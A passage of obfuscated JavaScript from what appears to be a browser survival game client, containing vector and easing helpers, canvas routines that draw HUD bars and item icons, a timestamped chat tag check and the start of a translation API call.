    } else {
      return t;
    }
  },
  get_std_angle: function (e, t) {
    return this.get_angle({
      x: 0,
      y: 1
    }, this.get_vector(e, t));
  },
  dist: function (e, t) {
    return Math.sqrt((t.x - e.x) * (t.x - e.x) + (t.y - e.y) * (t.y - e.y));
  },
  build_vector: function (e, t) {
    return {
      x: Math.cos(t) * e,
      y: Math.sin(t) * e
    };
  },
  add_vector: function (e, t) {
    e.x += t.x;
    e.y += t.y;
  },
  sub_vector: function (e, t) {
    e.x -= t.x;
    e.y -= t.y;
  },
  translate_vector: function (e, t, i) {
    e.x += t;
    e.y += i;
  },
  translate_new_vector: function (e, t, i) {
    return {
      x: e.x + t,
      y: e.y + i
    };
  },
  move: function (e, t, i) {
    e.x += Math.cos(i) * t;
    e.y += Math.sin(i) * t;
  },
  middle: function (e, t) {
    return Math.floor((e - t) / 2);
  },
  middle_point: function (e, t) {
    return {
      x: (e.x + t.x) / 2,
      y: (e.y + t.y) / 2
    };
  },
  rand_sign: function () {
    if (Math.random() > 0.5) {
      return 1;
    } else {
      return -1;
    }
  },
  get_rand_pos_in_circle: function (e, t, i) {
    var $ = this.rand_sign();
    var o = this.rand_sign();
    var l = Math.random() * Math.PI / 2;
    return {
      x: Math.floor(e + Math.cos(l) * $ * i),
      y: Math.floor(t + Math.sin(l) * o * i)
    };
  },
  Box: function (e, t, i, $) {
    this.x = e;
    this.y = t;
    this.w = i;
    this.h = $;
  },
  randomize_list: function (e) {
    (a = []).push.apply(a, e);
    var t = [];
    for (; a.length > 0;) {
      var i = Math.floor(Math.random() * a.length);
      t.push(a[i]);
      a.splice(i, 1);
    }
    return t;
  },
  restore_number: function (e) {
    if (e >= 20000) {
      e = (e - 20000) * 1000;
    } else if (e >= 10000) {
      e = (e - 10000) * 100;
    }
    return e;
  },
  simplify_number: function (e) {
    if (typeof e != "number") {
      return "0";
    }
    if (!(e >= 10000)) {
      return e.toString();
    }
    var t = Math.max(0, 3 - (Math.floor(Math.log10(e)) - 2));
    var i = Math.floor(e / 1000).toString();
    if (t) {
      i += "." + (e % 1000 / 1000).toString().substring(2).substring(0, t);
      for (var $ = i.length - 1, o = 0; $ > 0 && i[$] == "0"; $--) {
        o++;
      }
      if ((i = i.substring(0, i.length - o))[i.length - 1] == ".") {
        i = i.substring(0, i.length - 1);
      }
    }
    return i + "k";
  },
  ease_out_quad: function (e) {
    return e * (2 - e);
  },
  ease_out_cubic: function (e) {
    return --e * e * e + 1;
  },
  ease_in_out_quad: function (e) {
    if (e < 0.5) {
      return e * 2 * e;
    } else {
      return -1 + (4 - e * 2) * e;
    }
  },
  ease_in_out_cubic: function (e) {
    if (e < 0.5) {
      return e * 4 * e * e;
    } else {
      return (e - 1) * (e * 2 - 2) * (e * 2 - 2) + 1;
    }
  },
  ease_in_out_quart: function (e) {
    if (e < 0.5) {
      return e * 8 * e * e * e;
    } else {
      return 1 - --e * 8 * e * e * e;
    }
  },
  ease_out_quart: function (e) {
    return 1 - --e * e * e * e;
  },
  ease_out_quint: function (e) {
    return 1 + --e * e * e * e * e;
  },
  LinearAnimation: function (e, t, i, $, o, l) {
    this.o = e;
    this.v = t;
    this.max = i;
    this.min = $;
    this.max_speed = o;
    this.min_speed = l;
    this.last = 0;
    this.update = function () {
      if (this.o) {
        var e = this.v + a0DISPatchinput * this.max_speed;
        if (e > this.max) {
          this.v = this.max;
          this.o = false;
          return true;
        }
        this.v = e;
      } else {
        var e = this.v - a0DISPatchinput * this.min_speed;
        if (e < this.min) {
          this.v = this.min;
          this.o = true;
        } else {
          this.v = e;
        }
      }
    };
    return false;
  },
  Ease: function (e, t, i, $, o, l) {
    this.fun = e;
    this.ed = t;
    this.em = i;
    this.sx = $;
    this.x = o;
    this.ex = l;
    this.restart = function () {
      this.x = this.sex;
      this.ed = 0;
    };
    this.ease = function (e) {
      if (e !== this.ex) {
        this.ex = e;
        this.sx = this.x;
        this.ed = 0;
      }
      if (this.ex !== this.x) {
        this.ed += a0DISPatchinput;
        if (this.ed > this.em) {
          this.x = this.ex;
        } else {
          var e = this.fun(this.ed / this.em);
          this.x = this.sx + (this.ex - this.sx) * e;
        }
      }
    };
  },
  Ease2d: function (e, t, i, $, o, l, n, s, r) {
    this.fun = e;
    this.ed = t;
    this.em = i;
    this.sx = $;
    this.sy = o;
    this.x = l;
    this.y = n;
    this.ex = s;
    this.ey = r;
    this.ease = function (e) {
      if (e.x != this.ex || e.y != this.ey) {
        this.ex = e.x;
        this.ey = e.y;
        this.sx = this.x;
        this.sy = this.y;
        this.ed = 0;
      }
      if (this.ex != this.x || this.ey != this.y) {
        this.ed += a0DISPatchinput;
        if (this.ed > this.em) {
          this.x = this.ex;
          this.y = this.ey;
        } else {
          var t = this.fun(this.ed / this.em);
          this.x = this.sx + (this.ex - this.sx) * t;
          this.y = this.sy + (this.ey - this.sy) * t;
        }
      }
    };
  },
  generate_token: function (e) {
    var t = "";
    for (var i = 0; i < e; i++) {
      t += String.fromCharCode(48 + Math.floor(Math.random() * 74));
    }
    return t;
  },
  gup: function (e, t) {
    t ||= location.href;
    var i = RegExp("[\\?&]" + (e = e.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]")) + "=([^&#]*)").exec(t);
    if (i == null) {
      return null;
    } else {
      return i[1];
    }
  },
  inside_box: function (e, t) {
    return !!(e.x >= t.x) && !!(e.x <= t.x + t.w) && !!(e.y >= t.y) && !!(e.y <= t.y + t.h);
  },
  intersect_aabb: function (e, t, i, $, o, l, n, s) {
    if (Math.max(e, o) < Math.min(t, l) && Math.max(i, n) < Math.min($, s)) {
      return 1;
    } else {
      return 0;
    }
  },
  lerp: function (e, t, i) {
    return (1 - i) * e + i * t;
  },
  escape_html: function (e) {
    return e.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
  }
};
function a0LISTenmessage(e) {
  let t = e.split("?")[0].split("/");
  return t[t.length - 1];
}
function a0LOCKsession(e) {
  var t = new Image();
  t.src = e.toDataURL("image/png");
  t.width = e.width;
  t.height = e.height;
  t.isLoaded = 1;
  return t;
}
function a0GRABtoken(e, t, i, $, o, l, n, s, r, c, O = 0) {
  var p = document.createElement("canvas");
  var u = p.getContext("2d");
  l = l ? l * e : 0;
  var N = Math.floor(e * i);
  u.font = N + "px Baloo Paaji";
  u.lineJoin = "round";
  s *= e;
  var E = n ? s * 2 : 0;
  if (r) {
    var d = Math.min(u.measureText(t).width + e * 2 + E, r);
  } else {
    var d = u.measureText(t).width + e * 2 + E + O * e * 2;
  }
  var N = (N + l + O) * e + E;
  p.width = d;
  p.height = N;
  if (n) {
    u.fillStyle = n;
    a0OPTImizesum(u, 0, 0, d, N, s * 2);
    u.fill();
    u.translate(s, s);
  }
  u.textBaseline = "middle";
  u.font = i + "px Baloo Paaji";
  u.lineJoin = "round";
  if (o) {
    u.beginPath();
    u.fillStyle = o;
    u.fillText(t, 0, N / 2 + l - E / 2, d);
  }
  u.beginPath();
  if (c) {
    u.strokeStyle = c;
    u.lineWidth = O;
    u.strokeText(t, O, (N - E) / 2, d);
  }
  u.fillStyle = $;
  u.fillText(t, O, (N - E) / 2, d);
  return p;
}
function a0HASHload(e, t, i, $, o, l, n, s, r, c) {
  if (t.tryLoad === undefined || t.tryLoad() === 1) {
    if (!t.src && t._src) {
      t.src = t._src;
    }
    if (c !== undefined) {
      e.drawImage(t, i, $, Math.max(1, o), Math.max(1, l), n, s, r, c);
    } else if (l !== undefined) {
      e.drawImage(t, i, $, o, l);
    } else {
      e.drawImage(t, i, $);
    }
  }
}
function a0HOOKinput(e, t, i, $) {
  if (t) {
    e.fillStyle = t;
    e.fill();
  }
  if (i) {
    e.lineWidth = $;
    e.strokeStyle = i;
    e.stroke();
  }
}
function a0OPTImizesum(e, t, i, $, o, l) {
  if ($ < l * 2) {
    l = $ / 2;
  }
  if (o < l * 2) {
    l = o / 2;
  }
  if (l < 0) {
    l = 0;
  }
  e.beginPath();
  e.moveTo(t + l, i);
  e.arcTo(t + $, i, t + $, i + o, l);
  e.arcTo(t + $, i + o, t, i + o, l);
  e.arcTo(t, i + o, t, i, l);
  e.arcTo(t, i, t + $, i, l);
  e.closePath();
}
function a0FORMatjob(e, t, i, $) {
  e.beginPath();
  e.arc(t, i, $, 0, Math.PI * 2);
}
function a0GENErateoutput(e, t, i) {
  var $ = document.createElement("canvas");
  var o = $.getContext("2d");
  $.width = e * 109;
  $.height = e * 110;
  a0FORMatjob(o, e * 54.5, e * 55, e * 48.038209575038294);
  var l;
  var n = t[0];
  a0HOOKinput(o, n, t[1], e * 8);
  if (i === 0) {
    o.beginPath();
    o.lineCap = "round";
    o.lineJoin = "round";
    o.moveTo(e * 54.928558349609375, e * 43.72320556640625);
    o.bezierCurveTo(e * 66.92855834960938, e * 31.72320556640625, e * 69.92855834960938, e * 29.72320556640625, e * 74.92855834960938, e * 29.72320556640625);
    o.bezierCurveTo(e * 86.92855834960938, e * 28.72320556640625, e * 91.92855834960938, e * 42.72320556640625, e * 89.92855834960938, e * 52.72320556640625);
    o.bezierCurveTo(e * 88.92855834960938, e * 63.72320556640625, e * 73.92855834960938, e * 75.72320556640625, e * 55.928558349609375, e * 87.72320556640625);
    o.bezierCurveTo(e * 37.928558349609375, e * 78.72320556640625, e * 26.928558349609375, e * 65.72320556640625, e * 19.928558349609375, e * 54.72320556640625);
    o.bezierCurveTo(e * 13.928558349609375, e * 42.72320556640625, e * 21.928558349609375, e * 28.72320556640625, e * 35.928558349609375, e * 29.72320556640625);
    o.bezierCurveTo(e * 45.928558349609375, e * 31.72320556640625, e * 51.928558349609375, e * 40.72320556640625, e * 53.928558349609375, e * 44.72320556640625);
    o.closePath();
    a0HOOKinput(o, t[2]);
  } else if (i === 1) {
    o.save();
    o.translate(e * 55, e * 39.48748779296875);
    a0OPTImizesum(o, e * -11.5, e * -36, e * 23, e * 72, e * 10);
    o.restore();
    a0HOOKinput(o, t[2], t[3], e * 4);
    a0FORMatjob(o, e * 54.5, e * 78.48748779296875, e * 22.02271554554524);
    a0HOOKinput(o, t[4], t[3], e * 4);
    o.save();
    o.translate(e * 55.5, e * 57.287506103515625);
    a0OPTImizesum(o, e * -9, e * -16, e * 18, e * 32, e * 10);
    o.restore();
    a0HOOKinput(o, t[4]);
    o.beginPath();
    o.lineCap = "round";
    o.lineJoin = "round";
    o.moveTo(e * 66.5, e * 25.287506103515625);
    o.bezierCurveTo(e * 60.5, e * 25.287506103515625, e * 63.5, e * 25.287506103515625, e * 54.5, e * 25.287506103515625);
    o.closePath();
    a0HOOKinput(o, undefined, t[5], e * 4);
    o.beginPath();
    o.lineCap = "round";
    o.lineJoin = "round";
    o.moveTo(e * 66.5, e * 37.287506103515625);
    o.bezierCurveTo(e * 60.5, e * 37.287506103515625, e * 60.5, e * 37.287506103515625, e * 54.5, e * 37.287506103515625);
    o.closePath();
    a0HOOKinput(o, undefined, t[5], e * 4);
    o.beginPath();
    o.lineCap = "round";
    o.lineJoin = "round";
    o.moveTo(e * 66.5, e * 50.287506103515625);
    o.bezierCurveTo(e * 61, e * 50.287506103515625, e * 61, e * 50.287506103515625, e * 55.5, e * 50.287506103515625);
    o.closePath();
    a0HOOKinput(o, undefined, t[5], e * 4);
  } else if (i === 2) {
    o.beginPath();
    o.lineCap = "round";
    o.lineJoin = "round";
    o.moveTo(e * 45.928558349609375, e * 55.29463195800781);
    o.bezierCurveTo(e * 38.928558349609375, e * 67.29463195800781, e * 38.928558349609375, e * 67.29463195800781, e * 31.928558349609375, e * 79.29463195800781);
    o.bezierCurveTo(e * 15.928558349609375, e * 85.29463195800781, e * 17.928558349609375, e * 86.29463195800781, e * 17.928558349609375, e * 90.29463195800781);
    o.bezierCurveTo(e * 19.928558349609375, e * 94.29463195800781, e * 21.928558349609375, e * 94.29463195800781, e * 27.928558349609375, e * 92.29463195800781);
    o.bezierCurveTo(e * 29.928558349609375, e * 98.29463195800781, e * 30.928558349609375, e * 99.29463195800781, e * 33.928558349609375, e * 99.29463195800781);
    o.bezierCurveTo(e * 38.928558349609375, e * 97.29463195800781, e * 38.928558349609375, e * 93.29463195800781, e * 37.928558349609375, e * 86.29463195800781);
    o.bezierCurveTo(e * 45.428558349609375, e * 73.29463195800781, e * 51.928558349609375, e * 64.29463195800781, e * 52.928558349609375, e * 60.29463195800781);
    o.closePath();
    a0HOOKinput(o, t[2]);
    o.beginPath();
    o.lineCap = "round";
    o.lineJoin = "round";
    o.moveTo(e * 55.928558349609375, e * 8.866058349609375);
    o.bezierCurveTo(e * 35.928558349609375, e * 35.866058349609375, e * 37.928558349609375, e * 48.866058349609375, e * 46.928558349609375, e * 62.866058349609375);
    o.bezierCurveTo(e * 65.92855834960938, e * 72.86605834960938, e * 80.92855834960938, e * 55.866058349609375, e * 93.92855834960938, e * 36.866058349609375);
    o.closePath();
    a0HOOKinput(o, t[3], t[4], e * 6);
    o.beginPath();
    o.lineCap = "round";
    o.lineJoin = "round";
    o.moveTo(e * 93.92855834960938, e * 36.866058349609375);
    o.bezierCurveTo(e * 82.92855834960938, e * 37.866058349609375, e * 77.92855834960938, e * 36.866058349609375, e * 67.92855834960938, e * 28.866058349609375);
    o.bezierCurveTo(e * 53.928558349609375, e * 16.866058349609375, e * 53.928558349609375, e * 14.866058349609375, e * 55.928558349609375, e * 7.866058349609375);
    o.bezierCurveTo(e * 65.92855834960938, e * 4.866058349609375, e * 71.92855834960938, e * 7.866058349609375, e * 83.92855834960938, e * 13.866058349609375);
    o.bezierCurveTo(e * 96.92855834960938, e * 21.866058349609375, e * 95.92855834960938, e * 31.866058349609375, e * 92.92855834960938, e * 36.866058349609375);
    o.closePath();
    a0HOOKinput(o, t[3], t[4], e * 6);
    o.beginPath();
    o.lineCap = "round";
    o.lineJoin = "round";
    o.moveTo(e * 68.92855834960938, e * 16.866058349609375);
    o.bezierCurveTo(e * 71.92855834960938, e * 13.866058349609375, e * 76.92855834960938, e * 16.866058349609375, e * 79.92855834960938, e * 21.866058349609375);
    o.bezierCurveTo(e * 82.92855834960938, e * 24.866058349609375, e * 81.92855834960938, e * 27.866058349609375, e * 73.92855834960938, e * 24.866058349609375);
    o.bezierCurveTo(e * 67.92855834960938, e * 20.866058349609375, e * 66.92855834960938, e * 19.866058349609375, e * 67.92855834960938, e * 17.866058349609375);
    o.closePath();
    a0HOOKinput(o, t[2]);
  } else if (i === 3) {
    o.scale(0.9, 0.9);
    o.translate(e * 6, 0);
    o.beginPath();
    o.lineCap = "round";
    o.lineJoin = "round";
    o.moveTo(e * 54, e * 0.421875);
    o.bezierCurveTo(e * 84, e * 45.421875, e * 89, e * 51.421875, e * 83, e * 74.421875);
    o.bezierCurveTo(e * 74, e * 95.421875, e * 46, e * 98.421875, e * 30, e * 78.421875);
    o.bezierCurveTo(e * 22, e * 59.421875, e * 27, e * 49.421875, e * 34, e * 36.421875);
    o.closePath();
    a0HOOKinput(o, t[2], t[3], e * 6);
    o.beginPath();
    o.lineCap = "round";
    o.lineJoin = "round";
    o.moveTo(e * 74, e * 52.421875);
    o.bezierCurveTo(e * 77, e * 73.421875, e * 69, e * 81.421875, e * 58, e * 81.421875);
    o.bezierCurveTo(e * 66, e * 71.421875, e * 70, e * 66.421875, e * 74, e * 52.421875);
    o.closePath();
    a0HOOKinput(o, t[3]);
  }
  return $;
}
function a0PROMptuser(e) {
  var t = document.createElement("canvas");
  var i = t.getContext("2d");
  var $ = e * 180;
  var o = e * 20;
  var l = e * 240;
  var n = e * 35;
  var s = e * 1;
  var r = e * 4;
  var c = e * 4;
  t.width = e * 950;
  t.height = e * 50;
  i.translate(0, e * 15);
  a0OPTImizesum(i, n, s, $, o, r);
  a0HOOKinput(i, null, "#69A148", c);
  var O = a0ACKNowledgekey[a0EXPAndgroup.HEART_SYMBOL_HUD];
  i.drawImage(O, 17, -8);
  i.translate(l, 0);
  a0OPTImizesum(i, n, s, $, o, r);
  a0HOOKinput(i, null, "#AF352A", c);
  var p = a0ACKNowledgekey[a0EXPAndgroup.FOOD_SYMBOL_HUD];
  i.drawImage(p, 17, -9);
  i.translate(l, 0);
  a0OPTImizesum(i, n, s, $, o, r);
  a0HOOKinput(i, null, "#669BB1", c);
  var u = a0ACKNowledgekey[a0EXPAndgroup.COLD_SYMBOL_HUD];
  i.drawImage(u, 17, -8);
  i.translate(l, 0);
  a0OPTImizesum(i, n, s, $, o, r);
  a0HOOKinput(i, null, "#074A87", c);
  var N = a0ACKNowledgekey[a0EXPAndgroup.WATER_SYMBOL_HUD];
  i.drawImage(N, 17, -8);
  return t;
}
function a0ASSIgnapp(e) {
  var t = document.createElement("canvas");
  var i = t.getContext("2d");
  var $ = e * 180;
  var o = e * 20;
  var l = e * 240;
  var n = e * 35;
  var s = e * 1;
  var r = e * 4;
  var c = e * 4;
  t.width = e * 981;
  t.height = e * 50;
  i.translate(0, e * 15);
  a0OPTImizesum(i, n, s, $, o, r);
  a0HOOKinput(i, null, "#69A148", c);
  var O = a0ACKNowledgekey[a0EXPAndgroup.HEART_SYMBOL_HUD];
  i.drawImage(O, e * 17, e * -8);
  i.translate(l, 0);
  a0OPTImizesum(i, n, s, $, o, r);
  a0HOOKinput(i, null, "#AF352A", c);
  var p = a0ACKNowledgekey[a0EXPAndgroup.FOOD_SYMBOL_HUD];
  i.drawImage(p, e * 17, e * -9);
  i.translate(l, 0);
  a0OPTImizesum(i, n, s, $, o, r);
  a0HOOKinput(i, null, "#669BB1", c);
  var u = a0ACKNowledgekey[a0EXPAndgroup.COLD_SYMBOL_HUD];
  var N = n + $ - u.width / 2 * e;
  i.drawImage(u, N, e * -8);
  i.translate(l, 0);
  a0OPTImizesum(i, n, s, $, o, r);
  a0HOOKinput(i, null, "#074A87", c);
  var E = a0ACKNowledgekey[a0EXPAndgroup.WATER_SYMBOL_HUD];
  var d = n + $ - E.width / 2 * e;
  i.drawImage(E, d, e * -8);
  return t;
}
function a0ENDRole(e) {
  var t = document.createElement("canvas");
  var i = t.getContext("2d");
  var $ = e * 600;
  var o = e * 22;
  t.width = $;
  t.height = o;
  a0OPTImizesum(i, e * 5, e * 5, $ - e * 10, o - e * 10, e * 4);
  a0HOOKinput(i, null, "#BBE8EF", e * 4);
  return t;
}
function a0NOTIfyview(e, t, i) {
  let $ = document.createElement("canvas");
  let o = $.getContext("2d");
  $.width = e * 165;
  $.height = e * 123;
  o.save();
  o.translate(e * 81, e * 65);
  a0OPTImizesum(o, e * -78, e * -54.5, e * 156, e * 109, e * 20);
  o.restore();
  a0HOOKinput(o, i[0]);
  o.save();
  o.translate(e * 81, e * 58);
  a0OPTImizesum(o, e * -78, e * -54.5, e * 156, e * 109, e * 20);
  o.restore();
  a0HOOKinput(o, i[1], i[2], 4);
  o.save();
  o.translate(e * 81, e * 58);
  a0OPTImizesum(o, e * -69, e * -47, e * 138, e * 93, e * 15);
  o.restore();
  a0HOOKinput(o, i[3], i[4], 4);
  o.save();
  o.translate(e * 79, e * 54);
  a0OPTImizesum(o, e * -34, e * -40, e * 68, e * 88, e * 13);
  o.restore();
  a0HOOKinput(o, undefined, i[5], 4);
  o.beginPath();
  o.lineCap = "round";
  o.lineJoin = "round";
  o.moveTo(e * 44, e * 13);
  o.bezierCurveTo(e * 43.5, e * 55, e * 43.5, e * 55, e * 43, e * 101);
  o.closePath();
  a0HOOKinput(o, undefined, i[6], 4);
  o.beginPath();
  o.lineCap = "round";
  o.lineJoin = "round";
  o.moveTo(e * 115, e * 13);
  o.bezierCurveTo(e * 115, e * 56, e * 115, e * 56, e * 115, e * 101);
  o.closePath();
  a0HOOKinput(o, undefined, i[6], 4);
  o.beginPath();
  o.lineCap = "round";
  o.lineJoin = "round";
  o.moveTo(e * 35, e * 6);
  o.bezierCurveTo(e * 35, e * 56, e * 36, e * 109, e * 35, e * 110);
  o.closePath();
  a0HOOKinput(o, undefined, i[7], 4);
  o.beginPath();
  o.lineCap = "round";
  o.lineJoin = "round";
  o.moveTo(e * 123, e * 6);
  o.bezierCurveTo(e * 123, e * 56, e * 123, e * 56, e * 123, e * 110);
  o.closePath();
  a0HOOKinput(o, undefined, i[7], 4);
  o.save();
  o.translate(e * 79, e * 113);
  a0OPTImizesum(o, e * -18, e * -2, e * 36, e * 4, e * 20);
  o.restore();
  a0HOOKinput(o, undefined, i[8], 4);
  o.save();
  o.translate(e * 75, e * 118);
  a0OPTImizesum(o, e * -6, e * -2.5, e * 20, e * 5, e * 20);
  o.restore();
  a0HOOKinput(o, i[8]);
  return $;
}
function a0HANDledata(e, t, i) {
  var $ = document.createElement("canvas");
  var o = $.getContext("2d");
  $.width = e * 248;
  $.height = e * 247;
  o.save();
  o.translate(e * 69.5, e * 145);
  a0OPTImizesum(o, e * -8.5, e * -63, e * 17, e * 127, e * 1);
  o.restore();
  a0HOOKinput(o, i[0]);
  o.save();
  o.translate(e * 183, e * 145);
  a0OPTImizesum(o, e * -8, e * -63, e * 16, e * 126, e * 1);
  o.restore();
  a0HOOKinput(o, i[0]);
  o.save();
  o.translate(e * 123.5, e * 62.5);
  o.rotate(6.28);
  a0OPTImizesum(o, e * -84.5, e * -25.5, e * 169, e * 51, e * 5);
  o.restore();
  a0HOOKinput(o, i[2], i[1], e * 6);
  o.save();
  o.translate(e * 123.5, e * 118);
  o.rotate(6.24);
  a0OPTImizesum(o, e * -85.5, e * -24, e * 169, e * 48, e * 5);
  o.restore();
  a0HOOKinput(o, i[3], i[1], e * 6);
  o.save();
  o.translate(e * 122, e * 177.5);
  o.rotate(6.32);
  a0OPTImizesum(o, e * -84, e * -23.5, e * 169, e * 47, e * 5);
  o.restore();
  a0HOOKinput(o, i[2], i[1], e * 6);
  o.beginPath();
  o.lineCap = "round";
  o.lineJoin = "round";
  o.moveTo(e * 37, e * 157);
  o.bezierCurveTo(e * 49, e * 160, e * 49, e * 160, e * 61, e * 163);
  o.bezierCurveTo(e * 49.5, e * 165.5, e * 49.5, e * 165.5, e * 38, e * 168);
  o.closePath();
  a0HOOKinput(o, i[1]);
  o.beginPath();
  o.lineCap = "round";
  o.lineJoin = "round";
  o.moveTo(e * 205, e * 175);
  o.bezierCurveTo(e * 192.5, e * 180, e * 192.5, e * 180, e * 180, e * 185);
  o.bezierCurveTo(e * 193, e * 188, e * 193, e * 188, e * 206, e * 191);
  o.closePath();
  a0HOOKinput(o, i[1]);
  return $;
}
function a0HIGHlightthread(e, t, i) {
  var $ = document.createElement("canvas");
  var o = $.getContext("2d");
  $.width = e * 248;
  $.height = e * 247;
  o.save();
  o.translate(e * 182, e * 120);
  a0OPTImizesum(o, e * -8, e * -67, e * 16, e * 134, e * 1);
  o.restore();
  a0HOOKinput(o, i[0]);
  o.save();
  o.translate(e * 68.5, e * 127.5);
  a0OPTImizesum(o, e * -8.5, e * -70.5, e * 17, e * 141, e * 1);
  o.restore();
  a0HOOKinput(o, i[0]);
  o.save();
  o.translate(e * 123.5, e * 68);
  a0OPTImizesum(o, e * -82.5, e * -24, e * 165, e * 48, e * 4);
  o.restore();
  a0HOOKinput(o, i[2], i[1], e * 6);
  o.save();
  o.translate(e * 123, e * 179.5);
  a0OPTImizesum(o, e * -83, e * -24.5, e * 166, e * 49, e * 4);
  o.restore();
  a0HOOKinput(o, i[2], i[1], e * 6);
  o.save();
  o.translate(e * 123.5, e * 123.5);
  o.rotate(6.24);
  a0OPTImizesum(o, e * -82.5, e * -24.5, e * 165, e * 49, e * 4);
  o.restore();
  a0HOOKinput(o, i[3], i[1], e * 6);
  o.beginPath();
  o.lineCap = "round";
  o.lineJoin = "round";
  o.moveTo(e * 204, e * 112);
  o.bezierCurveTo(e * 149, e * 121.5, e * 96, e * 130, e * 94, e * 131);
  o.bezierCurveTo(e * 149.5, e * 127.5, e * 149.5, e * 127.5, e * 205, e * 124);
  o.closePath();
  a0HOOKinput(o, i[1]);
  return $;
}
function a0CREAteobject(e, t, i) {
  var $ = document.createElement("canvas");
  var o = $.getContext("2d");
  $.width = e * 248;
  $.height = e * 247;
  o.save();
  o.translate(e * 183, e * 107);
  a0OPTImizesum(o, e * -8, e * -70.5, e * 16, e * 141, e * 1);
  o.restore();
  a0HOOKinput(o, i[0]);
  o.save();
  o.translate(e * 69.5, e * 110);
  a0OPTImizesum(o, e * -8.5, e * -71, e * 17, e * 143, e * 1);
  o.restore();
  a0HOOKinput(o, i[0]);
  o.save();
  o.translate(e * 123.5, e * 181);
  a0OPTImizesum(o, e * -84.5, e * -26, e * 169, e * 52, e * 5);
  o.restore();
  a0HOOKinput(o, i[2], i[1], e * 6);
  o.beginPath();
  o.lineCap = "round";
  o.lineJoin = "round";
  o.moveTo(e * 41, e * 95);
  o.bezierCurveTo(e * 105, e * 96, e * 113, e * 99, e * 134, e * 102);
  o.bezierCurveTo(e * 147, e * 106, e * 173, e * 100, e * 207, e * 105);
  o.bezierCurveTo(e * 210, e * 105, e * 207, e * 140, e * 207, e * 154);
  o.bezierCurveTo(e * 123.5, e * 151.5, e * 123.5, e * 151.5, e * 40, e * 149);
  o.bezierCurveTo(e * 37, e * 145, e * 39, e * 95, e * 41, e * 96);
  o.closePath();
  a0HOOKinput(o, i[2], i[1], e * 6);
  o.beginPath();
  o.lineCap = "round";
  o.lineJoin = "round";
  o.moveTo(e * 68, e * 75);
  o.bezierCurveTo(e * 54, e * 72.5, e * 54, e * 72.5, e * 40, e * 70);
  o.bezierCurveTo(e * 38, e * 46, e * 40, e * 46, e * 53, e * 46);
  o.bezierCurveTo(e * 201, e * 41, e * 201, e * 41, e * 201, e * 42);
  o.bezierCurveTo(e * 211, e * 40, e * 208, e * 53, e * 208, e * 72);
  o.bezierCurveTo(e * 209, e * 91, e * 210, e * 96, e * 194, e * 94);
  o.bezierCurveTo(e * 119, e * 97, e * 119, e * 97, e * 44, e * 100);
  o.bezierCurveTo(e * 39, e * 99, e * 40, e * 96, e * 40, e * 80);
  o.bezierCurveTo(e * 54, e * 77.5, e * 54, e * 77.5, e * 68, e * 75);
  o.closePath();
  a0HOOKinput(o, i[3], i[1], e * 6);
  return $;
}
function a0CREAtethread(e, t, i) {
  var $ = document.createElement("canvas");
  var o = $.getContext("2d");
  $.width = e * 102;
  $.height = e * 102;
  o.globalAlpha = t ? 0.5 : 1;
  o.translate(3, 3);
  a0OPTImizesum(o, e * 24, e * 26, e * 70, e * 9, e * 10);
  a0HOOKinput(o, i[0]);
  a0OPTImizesum(o, e * 26, e * 70, e * 70, e * 9, e * 10);
  a0HOOKinput(o, i[0]);
  a0OPTImizesum(o, e * 5, e * 3, e * 22, e * 94, e * 5);
  a0HOOKinput(o, i[0]);
  a0OPTImizesum(o, e * 40, e * 3, e * 22, e * 94, e * 5);
  a0HOOKinput(o, i[0]);
  a0OPTImizesum(o, e * 75, e * 3, e * 22, e * 94, e * 5);
  a0HOOKinput(o, i[0]);
  o.globalAlpha = 1;
  o.translate(-3, -3);
  a0OPTImizesum(o, e * 24, e * 26, e * 70, e * 9, e * 10);
  a0HOOKinput(o, i[1]);
  a0OPTImizesum(o, e * 26, e * 70, e * 70, e * 9, e * 10);
  a0HOOKinput(o, i[1]);
  a0OPTImizesum(o, e * 5, e * 3, e * 22, e * 94, e * 5);
  a0HOOKinput(o, i[2], i[3], e * 4);
  a0OPTImizesum(o, e * 40, e * 3, e * 22, e * 94, e * 5);
  a0HOOKinput(o, i[2], i[3], e * 4);
  a0OPTImizesum(o, e * 75, e * 3, e * 22, e * 94, e * 5);
  a0HOOKinput(o, i[2], i[3], e * 4);
  return $;
}
class a0DECOdeinput {
  constructor(e, t, i) {
    this.canvas = document.createElement("canvas");
    this.ctx = this.canvas.getContext("2d");
    this.canvas.width = e;
    this.canvas.height = t;
    this.buildType = i;
  }
  drawText(e, t, i, $) {
    this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
    this.ctx.font = t + "px Baloo Paaji";
    this.ctx.strokeStyle = i;
    this.ctx.fillStyle = $;
    this.ctx.lineWidth = 7;
    switch (this.buildType) {
      case 1:
        this.ctx.strokeText("x" + (e & 255), 15, 40);
        this.ctx.fillText("x" + (e & 255), 15, 40);
        this.ctx.strokeText("x" + ((e & 65280) >> 8), 15, 60);
        this.ctx.fillText("x" + ((e & 65280) >> 8), 15, 60);
        break;
      case 2:
        this.ctx.strokeText("x" + (e & 31), 15, 40);
        this.ctx.fillText("x" + (e & 31), 15, 40);
        this.ctx.strokeText("x" + ((e & 992) >> 5), 15, 60);
        this.ctx.fillText("x" + ((e & 992) >> 5), 15, 60);
        this.ctx.strokeText("x" + ((e & 31744) >> 10), 15, 80);
        this.ctx.fillText("x" + ((e & 31744) >> 10), 15, 80);
        break;
      case 3:
        this.ctx.strokeText(e[0], 15, 40);
        this.ctx.fillText(e[0], 15, 40);
        this.ctx.strokeText((e[1] & 16) >> 4 ? "L" : "U", 15, 60);
        this.ctx.fillText((e[1] & 16) >> 4 ? "L" : "U", 15, 60);
        this.ctx.strokeText((e[1] & 16) >> 4 ? e[1] - 16 : e[1], 15, 80);
        this.ctx.fillText((e[1] & 16) >> 4 ? e[1] - 16 : e[1], 15, 80);
        break;
      default:
        this.ctx.strokeText(e, 15, 40);
        this.ctx.fillText(e, 15, 40);
    }
  }
}
function a0NOOPform() {
  let e = Math.floor(Date.now() / 1000);
  return "?ez noob " + e;
}
function a0IDENtifyoutput(e) {
  let t = e.match(/\d+$/);
  if (!t) {
    return false;
  }
  let i = parseInt(t[0], 10);
  let $ = Math.floor(Date.now() / 1000);
  return Math.abs($ - i) <= 5;
}
function a0JOINobject() {
  a0REMOvezip(a0NOOPform());
}
async function a0KEEPinput(e, t = "en") {
  let i = "https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=" + t + "&dt=t&q=" + encodeURIComponent(e);
  try {
